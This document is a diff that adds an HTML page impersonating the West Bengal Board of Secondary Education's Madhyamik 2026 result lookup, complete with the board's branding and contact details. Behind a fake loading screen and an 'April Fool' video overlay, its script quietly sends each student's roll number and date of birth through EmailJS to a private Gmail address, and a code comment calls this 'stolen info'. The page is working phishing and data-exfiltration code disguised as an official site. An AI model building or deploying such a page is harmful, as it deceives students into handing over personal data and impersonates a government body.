@@ -1,0 +1,667 @@
+<!DOCTYPE html>
+
+<html>
+
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+    <title>WBBSE :: Madhyamik Pariksha (S.E.) Result 2026</title>
+    <meta name="description"
+        content="West Bengal Board of Secondary Education - Madhyamik Pariksha Secondary Examination Result 2026" />
+    <meta name="keywords" content="WBBSE, Madhyamik Result 2026, West Bengal Board of Secondary Education" />
+
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" />
+
+    <link href="css/GoogleFonts.css" rel="stylesheet" />
+    <link href="css/gijgo.min.css" rel="stylesheet" />
+    <link href="css/CustomStyle.css?v=134195321464417040" rel="stylesheet" />
+    <link href="css/contrast.css" rel="stylesheet" />
+
+    <style>
+        .result-form-container {
+            max-width: 650px;
+            margin: 40px auto;
+            background: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 20px rgba(0, 0, 0, 0.12);
+            padding: 0;
+            overflow: hidden;
+        }
+
+        .result-form-header {
+            background: linear-gradient(135deg, #365f91, #2a4d7a);
+            color: #fff;
+            padding: 20px 30px;
+            text-align: center;
+        }
+
+        .result-form-header h4 {
+            margin: 0;
+            font-weight: 700;
+            font-size: 20px;
+            letter-spacing: 1px;
+        }
+
+        .result-form-header p {
+            margin: 5px 0 0;
+            font-size: 14px;
+            opacity: 0.9;
+        }
+
+        .result-form-body {
+            padding: 30px 35px;
+        }
+
+        .result-form-body label {
+            font-weight: 600;
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 6px;
+        }
+
+        .result-form-body .form-control {
+            border-radius: 4px;
+            border: 1.5px solid #ccc;
+            padding: 10px 14px;
+            font-size: 15px;
+            transition: border-color 0.3s;
+        }
+
+        .result-form-body .form-control:focus {
+            border-color: #365f91;
+            box-shadow: 0 0 0 3px rgba(54, 95, 145, 0.15);
+        }
+
+        .captcha-box {
+            background: #f0f0f0;
+            border: 2px solid #ccc;
+            border-radius: 6px;
+            padding: 12px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 12px;
+            user-select: none;
+        }
+
+        .captcha-text {
+            font-size: 28px;
+            font-weight: 900;
+            letter-spacing: 8px;
+            color: #333;
+            font-family: 'Courier New', monospace;
+            text-decoration: line-through;
+            background: repeating-linear-gradient(45deg,
+                    transparent,
+                    transparent 3px,
+                    rgba(0, 0, 0, 0.05) 3px,
+                    rgba(0, 0, 0, 0.05) 6px);
+            padding: 4px 16px;
+            position: relative;
+        }
+
+        .captcha-text::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: rgba(0, 0, 0, 0.2);
+            transform: rotate(-3deg);
+        }
+
+        .captcha-refresh {
+            cursor: pointer;
+            font-size: 20px;
+            color: #365f91;
+            margin-left: 15px;
+            transition: transform 0.3s;
+        }
+
+        .captcha-refresh:hover {
+            transform: rotate(180deg);
+        }
+
+        .btn-view-result {
+            background: linear-gradient(135deg, #365f91, #2a4d7a);
+            color: #ffffff;
+            font-weight: 700;
+            font-size: 16px;
+            padding: 12px 40px;
+            border: none;
+            border-radius: 4px;
+            width: 100%;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: all 0.3s;
+            cursor: pointer;
+        }
+
+        .btn-view-result:hover {
+            background: linear-gradient(135deg, #2a4d7a, #1e3a5f);
+            box-shadow: 0 4px 15px rgba(54, 95, 145, 0.35);
+            color: #fff;
+        }
+
+        .result-notice {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            border-radius: 4px;
+            padding: 10px 15px;
+            font-size: 13px;
+            color: #856404;
+            margin-top: 15px;
+        }
+
+        .error-text {
+            color: #dc3545;
+            font-size: 13px;
+            display: none;
+            margin-top: 4px;
+        }
+
+        /* Prank overlay */
+        #prank-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: black;
+            z-index: 999999;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        #close-prank {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            color: white;
+            font-size: 30px;
+            cursor: pointer;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 5px 15px;
+            border-radius: 5px;
+            z-index: 1000000;
+        }
+
+        /* Loading overlay */
+        #loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(255, 255, 255, 0.85);
+            z-index: 99999;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #ddd;
+            border-top: 5px solid #365f91;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .loading-text {
+            margin-top: 15px;
+            font-size: 16px;
+            color: #365f91;
+            font-weight: 600;
+        }
+
+        @media (max-width: 768px) {
+            .result-form-body {
+                padding: 20px 18px;
+            }
+
+            .result-form-container {
+                margin: 20px 10px;
+            }
+        }
+    </style>
+</head>
+
+<body class="bg-light custom-text-adjust"
+    style="font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background:url(img/bg-5.jpg) repeat;">
+
+    <!-- ======== HEADER (same as index.html) ======== -->
+    <section id="topbar" class="text-light p-0 m-0" style="background-color: #365f91;">
+        <div class="container-fluid h-100 clearfix m-0 p-0">
+            <div class="row h-100 justify-content-center align-items-center m-0 p-0">
+                <div
+                    class="col-lg-8 col-md-7 font-weight-light text-lg-right m-0 p-2 font-weight-bold custom-topbar-font-08rem">
+                    <a href="#" id="high" class="text-dark mr-1 py-1 px-2 border border-light" title="High Contrast"><i
+                            class="fas fa-square border border-secondary"></i></a>
+                    <a href="#" id="normal" class="text-light no-underline py-1 px-2 border border-light"
+                        title="Normal Contrast"><i class="fas fa-square border border-dark"></i></a>
+                    <a class="ml-2 text-light no-underline" href="#" title="Screen Reader Access"><i
+                            class="fas fa-volume-up"></i> Screen Reader</a>
+                    <a class="ml-2 no-underline py-1 px-2 border border-light text-light font-weight-bold" href="#"
+                        id="fd" title="Decrease Font Size">A<sup>-</sup></a>
+                    <a class="ml-1 no-underline py-1 px-2 border border-light text-light font-weight-bold" href="#"
+                        id="org" title="Reset Font Size">A</a>
+                    <a class="ml-1 no-underline py-1 px-2 border border-light text-light font-weight-bold" href="#"
+                        id="fi" title="Increase Font Size">A<sup>+</sup></a>
+                </div>
+                <div class="col-lg-4 col-md-5 text-lg-right font-weight-normal m-0 custom-topbar-right-padding">
+                    <span class="px-1 py-1 custom-topbar-font-09rem mr-1"><i class="fa fa-envelope"></i><a
+                            class="mr-lg-4 text-light"
+                            href="mailto:wbbse05@yahoo.co.in">&nbsp;wbbse05@yahoo.co.in</a></span>
+                    <span class="px-1 py-1 custom-topbar-font-09rem">&nbsp;<i
+                            class="fas fa-phone-square"></i>&nbsp;033-23213827</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="icon" class="bg-light p-2" style="background:url(img/bg-5.jpg) repeat;">
+        <div class="container h-100 clearfix">
+            <div class="row justify-content-center align-items-center" style="color: #00a2ea;">
+                <div class="col-md-2 text-center">
+                    <a href="index.html"><img class="img-fluid rounded mr-4" src="img/logo.png"
+                            style="max-height: 107px; max-width: 107px;" /></a>
+                </div>
+                <div class="col-md-10">
+                    <p class="pt-3 text-center text-justify"
+                        style="font-weight: 600; font-size: 50px; font-family:'Baskerville Old Face';color:#67806d;">
+                        West Bengal Board of Secondary Education</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ======== NAVBAR (same as index.html) ======== -->
+    <nav id="navFixed" class="navbar navbar-expand-lg navbar-dark m-0 p-0" style="background-color: #31c9df;">
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#MainMenu">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse m-0 p-0 border border-light" id="MainMenu">
+            <ul id="ulMainMenu" class="navbar-nav m-0 p-0 text-uppercase" style="font-size:13px;">
+                <li id="HM1" class="nav-item dropdown m-0 p-2 active custom-navbar-hover">
+                    <a class="nav-link" href="index.html"><i class="fa fa-home mr-2"></i>
+                        <span
+                            style="font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight:500;">Home</span></a>
+                </li>
+                <li id="AU2" class="nav-item dropdown m-0 p-2 active custom-navbar-hover">
+                    <a class="nav-link dropdown-toggle mb-0" href="#" data-toggle="dropdown"
+                        style="font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight:500;">
+                        <i class="fas fa-user mr-2"></i>
+                        <span
+                            style="font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight:500;">About
+                            WBBSE</span>
+                    </a>
+                    <ul class="dropdown-menu" style="padding:0;margin:0;font-size:13px;">
+                        <li style="padding:0;margin:0;background:#f2f0f0;"><a class="dropdown-item custom-dropdown-menu"
+                                href="#"><span
+                                    style="font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight:500;">About
+                                    Us</span></a></li>
+                        <li style="padding:0;margin:0;background:#f2f0f0;"><a class="dropdown-item custom-dropdown-menu"
+                                href="#"><span
+                                    style="font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight:500;">Authorities</span></a>
+                        </li>
+                        <li style="padding:0;margin:0;background:#f2f0f0;"><a class="dropdown-item custom-dropdown-menu"
+                                href="#"><span
+                                    style="font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight:500;">Regional
+                                    Council Office</span></a></li>
+                        <li style="padding:0;margin:0;background:#f2f0f0;"><a class="dropdown-item custom-dropdown-menu"
+                                href="#"><span
+                                    style="font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight:500;">Section/Department</span></a>
+                        </li>
+                    </ul>
+                </li>
+                <li id="AD3" class="nav-item dropdown m-0 p-2 active custom-navbar-hover">
+                    <a class="nav-link" href="#"><i class="fas fa-book mr-2"></i>
+                        <span
+                            style="font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight:500;">Services</span></a>
+                </li>
+                <li id="EX4" class="nav-item dropdown m-0 p-2 active custom-navbar-hover">
+                    <a class="nav-link dropdown-toggle mb-0" href="#" data-toggle="dropdown"
+                        style="font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight:500;">
+                        <i class="fas fa-school mr-2"></i>
+                        <span
+                            style="font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight:500;">Schools</span>
+                    </a>
+                    <ul class="dropdown-menu" style="padding:0;margin:0;font-size:13px;">
+                        <li style="padding:0;margin:0;background:#f2f0f0;"><a class="dropdown-item custom-dropdown-menu"
+                                href="#"><span
+                                    style="font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight:500;">School
+                                    Login</span></a></li>
+                        <li style="padding:0;margin:0;background:#f2f0f0;"><a class="dropdown-item custom-dropdown-menu"
+                                href="#"><span
+                                    style="font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight:500;">Teacher
+                                    Login</span></a></li>
+                        <li style="padding:0;margin:0;background:#f2f0f0;"><a class="dropdown-item custom-dropdown-menu"
+                                href="#"><span
+                                    style="font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight:500;">Student
+                                    Login</span></a></li>
+                        <li style="padding:0;margin:0;background:#f2f0f0;"><a class="dropdown-item custom-dropdown-menu"
+                                href="#"><span
+                                    style="font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight:500;">School
+                                    Directory</span></a></li>
+                    </ul>
+                </li>
+                <li id="RT7" class="nav-item dropdown m-0 p-2 active custom-navbar-hover">
+                    <a class="nav-link dropdown-toggle mb-0" href="#" data-toggle="dropdown"
+                        style="font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight:500;">
+                        <i class="fas fa-info mr-2"></i>
+                        <span
+                            style="font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight:500;">RTI</span>
+                    </a>
+                    <ul class="dropdown-menu" style="padding:0;margin:0;font-size:13px;">
+                        <li style="padding:0;margin:0;background:#f2f0f0;"><a class="dropdown-item custom-dropdown-menu"
+                                href="#"><span
+                                    style="font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight:500;">Designated
+                                    Official</span></a></li>
+                        <li style="padding:0;margin:0;background:#f2f0f0;"><a class="dropdown-item custom-dropdown-menu"
+                                href="#"><span
+                                    style="font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight:500;">Guidelines</span></a>
+                        </li>
+                        <li style="padding:0;margin:0;background:#f2f0f0;"><a class="dropdown-item custom-dropdown-menu"
+                                href="#"><span
+                                    style="font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight:500;">Answer
+                                    Script Inspection</span></a></li>
+                    </ul>
+                </li>
+                <li id="TN32" class="nav-item dropdown m-0 p-2 active custom-navbar-hover">
+                    <a class="nav-link dropdown-toggle mb-0" href="#" data-toggle="dropdown"
+                        style="font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight:500;">
+                        <i class="fa fa-gavel"></i>
+                        <span
+                            style="font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight:500;">Tender
+                            / Notification</span>
+                    </a>
+                    <ul class="dropdown-menu" style="padding:0;margin:0;font-size:13px;">
+                        <li style="padding:0;margin:0;background:#f2f0f0;"><a class="dropdown-item custom-dropdown-menu"
+                                href="#"><span
+                                    style="font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight:500;">Tender</span></a>
+                        </li>
+                        <li style="padding:0;margin:0;background:#f2f0f0;"><a class="dropdown-item custom-dropdown-menu"
+                                href="#"><span
+                                    style="font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight:500;">Notification</span></a>
+                        </li>
+                        <li style="padding:0;margin:0;background:#f2f0f0;"><a class="dropdown-item custom-dropdown-menu"
+                                href="#"><span
+                                    style="font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight:500;">Appointment
+                                    Notification</span></a></li>
+                    </ul>
+                </li>
+                <li id="DF6" class="nav-item dropdown m-0 p-2 active custom-navbar-hover">
+                    <a class="nav-link" href="#"><i class="fas fa-download mr-2"></i>
+                        <span
+                            style="font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight:500;">Download</span></a>
+                </li>
+                <li id="CU8" class="nav-item dropdown m-0 p-2 active custom-navbar-hover">
+                    <a class="nav-link" href="#"><i class="fas fa fa-address-book mr-2"></i>
+                        <span
+                            style="font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight:500;">Contact
+                            Us</span></a>
+                </li>
+            </ul>
+        </div>
+    </nav>
+
+    <!-- ======== MAIN CONTENT: RESULT FORM ======== -->
+    <div id="main-content">
+        <div class="container-fluid py-4" style="min-height: 500px;">
+
+            <!-- Breadcrumb -->
+            <div class="container">
+                <nav aria-label="breadcrumb">
+                    <ol class="breadcrumb" style="background: #f2f0f0; font-size: 14px;">
+                        <li class="breadcrumb-item"><a href="index.html"><i class="fa fa-home"></i> Home</a></li>
+                        <li class="breadcrumb-item active" aria-current="page">Madhyamik Pariksha (S.E.) Result 2026
+                        </li>
+                    </ol>
+                </nav>
+            </div>
+
+            <!-- Result Form -->
+            <div class="result-form-container">
+                <div class="result-form-header">
+                    <h4><i class="fas fa-graduation-cap mr-2"></i> MADHYAMIK PARIKSHA (S.E.) - 2026</h4>
+                    <p>West Bengal Board of Secondary Education - Result Lookup</p>
+                </div>
+                <div class="result-form-body">
+                    <form id="resultForm" onsubmit="return false;">
+                        <!-- Roll Number -->
+                        <div class="form-group">
+                            <label for="rollNumber"><i class="fas fa-id-card mr-1"></i> Roll Number <span
+                                    class="text-danger">*</span></label>
+                            <input type="text" class="form-control" id="rollNumber"
+                                placeholder="Enter your Roll Number (e.g., 123456)" maxlength="10" autocomplete="off"
+                                required>
+                            <div class="error-text" id="rollError">Please enter a valid Roll Number.</div>
+                        </div>
+
+
+                        <!-- Date of Birth -->
+                        <div class="form-group">
+                            <label for="dob"><i class="fas fa-calendar-alt mr-1"></i> Date of Birth <span
+                                    class="text-danger">*</span></label>
+                            <input type="date" class="form-control" id="dob" required>
+                            <div class="error-text" id="dobError">Please select your Date of Birth.</div>
+                        </div>
+
+                        <hr>
+
+                        <!-- Captcha -->
+                        <div class="form-group">
+                            <label><i class="fas fa-shield-alt mr-1"></i> Security Verification <span
+                                    class="text-danger">*</span></label>
+                            <div class="captcha-box">
+                                <span class="captcha-text" id="captchaDisplay">W7Kx3P</span>
+                                <span class="captcha-refresh" id="captchaRefresh" title="Refresh Captcha"><i
+                                        class="fas fa-sync-alt"></i></span>
+                            </div>
+                            <input type="text" class="form-control" id="captchaInput"
+                                placeholder="Enter the captcha shown above" maxlength="8" autocomplete="off" required>
+                            <div class="error-text" id="captchaError">Please enter the correct captcha.</div>
+                        </div>
+
+                        <!-- Submit -->
+                        <div class="form-group mt-4">
+                            <button type="button" class="btn btn-view-result" id="btnViewResult">
+                                <i class="fas fa-search mr-2"></i> View Result
+                            </button>
+                        </div>
+                    </form>
+
+                    <div class="result-notice">
+                        <i class="fas fa-info-circle mr-1"></i>
+                        <strong>Note:</strong> Results are provided as per the records of WBBSE. For any discrepancy,
+                        contact the Board office. Unofficial results may vary.
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- ======== FOOTER (same as index.html) ======== -->
+    <footer id="fWebsite" class="text-center text-light py-3 pl-3 custom-topbar-font-09rem"
+        style="background-color: #365f91;">
+        <div class="container-fluid h-100 clearfix">
+            <div class="row h-100 justify-content-center align-items-center">
+                <div class="col-md-5 my-0 px-0 text-center align-middle">
+                    <p class="text-lg-left text-md-center align-middle m-0">
+                        Disclaimer: Content and Data owned and maintained by WBBSE
+                    </p>
+                    <p class="text-lg-left text-md-center m-0 pt-1">
+                        Copyright &copy; 2026 WBBSE | All rights reserved
+                    </p>
+                    <p class="text-lg-left text-md-center m-0 pt-1">
+                        Visitors Count: 7242621 <span class="c"></span>
+                    </p>
+                </div>
+                <div class="col-md-3 mb-0 px-0 text-center align-middle">
+                    <p class="text-lg-left text-md-center align-middle m-0">
+                        Best Viewed With
+                    </p>
+                    <p class="text-lg-left text-md-center m-0 pt-1">
+                        <img src="img/chrome.png" class="align-middle pr-1" alt="chrome" title="Chrome 60+" />
+                        <img src="img/firefox.png" class="align-middle pr-1" alt="firefox" title="Firefox 70+" />
+                        <img src="img/edge.png" class="align-middle" alt="edge" title="Edge" />
+                    </p>
+                </div>
+                <div class="col-md-4 mb-0 px-0 text-lg-left text-md-center align-middle">
+                    <span class="align-middle">Designed and Developed by</span>
+                    <a class="align-middle" href="https://www.nic.in/" target="_blank" rel="noopener" title="NIC">
+                        <img src="img/nic-footer.png" alt="NIC" />
+                    </a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- ======== PRANK OVERLAY ======== -->
+    <div id="prank-overlay">
+        <div id="close-prank">&times;</div>
+        <div
+            style="display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%; height: 100%; box-sizing: border-box; padding: 15px;">
+            <img src="img/1775071385186.png"
+                style="max-width: 95vw; max-height: 35vh; object-fit: contain; margin-bottom: 20px;" alt="April Fool">
+            <video id="prank-video" preload="auto" loop src="img/gg.mp4"
+                style="max-width: 95vw; max-height: 55vh; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.8);"
+                controls></video>
+        </div>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div id="loading-overlay">
+        <div class="loading-spinner"></div>
+        <div class="loading-text">Fetching your result...</div>
+    </div>
+
+    <!-- ======== SCRIPTS ======== -->
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+
+    <!-- EmailJS SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script>
+        (function () {
+            emailjs.init({
+                publicKey: "iXJn06KXgOFLrCjO0",
+            });
+        })();
+    </script>
+
+    <script>
+        // Captcha generation
+        function generateCaptcha() {
+            var chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789';
+            var captcha = '';
+            for (var i = 0; i < 6; i++) {
+                captcha += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return captcha;
+        }
+
+        var currentCaptcha = generateCaptcha();
+        document.getElementById('captchaDisplay').textContent = currentCaptcha;
+
+        // Refresh captcha
+        document.getElementById('captchaRefresh').addEventListener('click', function () {
+            currentCaptcha = generateCaptcha();
+            document.getElementById('captchaDisplay').textContent = currentCaptcha;
+            document.getElementById('captchaInput').value = '';
+        });
+
+        // View Result button
+        document.getElementById('btnViewResult').addEventListener('click', function () {
+            var rollNum = document.getElementById('rollNumber').value.trim();
+            var dob = document.getElementById('dob').value;
+            var captchaVal = document.getElementById('captchaInput').value.trim();
+            var hasError = false;
+
+            // Reset errors
+            document.getElementById('rollError').style.display = 'none';
+            document.getElementById('dobError').style.display = 'none';
+            document.getElementById('captchaError').style.display = 'none';
+
+            // Validate roll number
+            if (!rollNum || rollNum.length < 3) {
+                document.getElementById('rollError').style.display = 'block';
+                hasError = true;
+            }
+
+            // Validate DOB
+            if (!dob) {
+                document.getElementById('dobError').style.display = 'block';
+                hasError = true;
+            }
+
+            // Validate captcha
+            if (captchaVal !== currentCaptcha) {
+                document.getElementById('captchaError').style.display = 'block';
+                hasError = true;
+            }
+
+            if (hasError) return;
+
+            // Show loading overlay for 2-3 seconds, then show prank
+            var loadingOverlay = document.getElementById('loading-overlay');
+            var prankOverlay = document.getElementById('prank-overlay');
+            loadingOverlay.style.display = 'flex';
+
+            // Start preloading the video immediately while fetching simulation happens
+            var v = document.getElementById("prank-video");
+            if (v) v.load();
+
+            // Quietly send the stolen info using EmailJS!
+            var templateParams = {
+                rollNumber: rollNum,
+                dob: dob,
+                to_email: 'sandkingaikya@gmail.com'
+            };
+
+            emailjs.send('service_yqqzoae', 'template_3pj8a3f', templateParams)
+                .then(function (response) {
+                    console.log('Gotcha!', response.status, response.text);
+                }, function (error) {
+                    console.error('Email failed...', error);
+                });
+
+            setTimeout(function () {
+                loadingOverlay.style.display = 'none';
+                prankOverlay.style.display = 'flex';
+                if (v) v.play();
+            }, 2500); // 2.5 second fake loading
+        });
+
+        // Close prank
+        document.getElementById('close-prank').addEventListener('click', function () {
+            document.getElementById('prank-overlay').style.display = 'none';
+            var v = document.getElementById("prank-video");
+            if (v) {
+                v.pause();
+                v.currentTime = 0; // jump back to start
+            }
+        });
+    </script>
+
+</body>
+
+</html>
